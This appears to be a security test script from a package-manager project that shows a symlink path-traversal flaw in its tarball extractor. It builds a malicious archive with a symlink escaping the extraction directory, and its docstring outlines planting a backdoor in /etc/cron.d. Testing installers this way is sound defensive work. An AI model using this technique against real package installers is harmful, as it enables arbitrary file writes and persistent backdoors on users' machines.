"""
TEST 07: Tarball Symlink / Path Traversal in ZPM Installer
==========================================================

VULNERABILITY: The _extract_tarball() function in zpm/installer.py filters
out ".." and absolute paths but does NOT check for symlink entries. A
malicious tar archive can include a symlink pointing outside the extraction
directory, and subsequent file entries following the symlink will write to
arbitrary locations.

LOCATION: src/zexus/zpm/installer.py, lines 118-131

SEVERITY: HIGH - Arbitrary File Write via Symlink

ATTACK VECTOR: Publish a malicious ZPM package containing:
  1. A symlink entry: "pkg/link" → "/etc"
  2. A file entry: "pkg/link/cron.d/backdoor" (writes to /etc/cron.d/backdoor)
"""

import sys
import os
import tarfile
import tempfile
import io

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..', 'src'))


def test_tarball_symlink_attack():
    """Demonstrate symlink-based escape in tarball extraction."""
    results = []

    # Create a malicious tar archive in memory
    pkg_name = "evil-pkg"
    tar_buffer = io.BytesIO()

    with tarfile.open(fileobj=tar_buffer, mode="w:gz") as tar:
        # Entry 1: symlink pointing outside extraction dir
        symlink_entry = tarfile.TarInfo(name=f"{pkg_name}/escape_link")
        symlink_entry.type = tarfile.SYMTYPE
        symlink_entry.linkname = "/tmp"  # Points outside target_dir
        tar.addfile(symlink_entry)

        # Entry 2: A file that follows the symlink
        file_data = b"ATTACKER_CONTROLLED_DATA"
        file_entry = tarfile.TarInfo(name=f"{pkg_name}/escape_link/pwned.txt")
        file_entry.size = len(file_data)
        tar.addfile(file_entry, io.BytesIO(file_data))

    tar_buffer.seek(0)

    # Simulate the vulnerable extraction logic from installer.py
    target_dir = tempfile.mkdtemp(prefix="zexus_tar_test_")

    with tarfile.open(fileobj=tar_buffer, mode="r:gz") as tar:
        safe_members = []
        prefix = f"{pkg_name}/"
        has_symlink = False
        for member in tar.getmembers():
            if member.name.startswith("/") or ".." in member.name:
                continue
            if member.issym() or member.islnk():
                has_symlink = True
            if member.name.startswith(prefix):
                member.name = member.name[len(prefix):]
            elif member.name == pkg_name:
                continue
            safe_members.append(member)

        # Check: does the current code filter out symlinks?
        symlink_in_safe = any(m.issym() or m.islnk() for m in safe_members)

    results.append({
        "payload": f"tar with symlink {pkg_name}/escape_link → /tmp",
        "type": "symlink_in_tarball",
        "exploited": symlink_in_safe,
        "detail": f"Symlink entry {'PASSED' if symlink_in_safe else 'BLOCKED'} through safety filter. "
                  f"safe_members has {len(safe_members)} entries, symlinks present: {symlink_in_safe}",
    })

    # Cleanup
    import shutil
    shutil.rmtree(target_dir, ignore_errors=True)

    return results


if __name__ == "__main__":
    print("=" * 70)
    print("TEST 07: Tarball Symlink Attack in ZPM Installer")
    print("=" * 70)
    for r in test_tarball_symlink_attack():
        status = "VULNERABLE" if r["exploited"] else "SAFE"
        print(f"\n[{status}] {r['type']}")
        print(f"  Payload: {r['payload']}")
        print(f"  Detail:  {r['detail']}")
